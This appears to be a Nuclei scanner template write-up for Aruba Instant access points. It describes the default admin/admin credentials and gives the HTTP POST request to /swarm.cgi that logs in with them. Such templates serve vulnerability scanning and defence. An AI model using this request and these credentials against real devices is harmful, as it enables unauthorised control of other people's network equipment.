# Nuclei Template: Aruba Instant - Default Login
**Template ID:** aruba-instant-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`aruba-instant-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Aruba Instant is an AP device. The device has a default password, and attackers can control the entire platform through the default password admin/admin vulnerability, and use administrator privileges to operate core functions.

## Steps to reproduce / Exploit Payload
```http
POST /swarm.cgi  HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

opcode=login&user={{username}}&passwd={{password}}&refresh=false&nocache=0.17699820340903838
```

## References
- https://www.192-168-1-1-ip.co/aruba-networks/routers/179/#:~:text=The%20default%20username%20for%20your,control%20panel%20of%20your%20router.
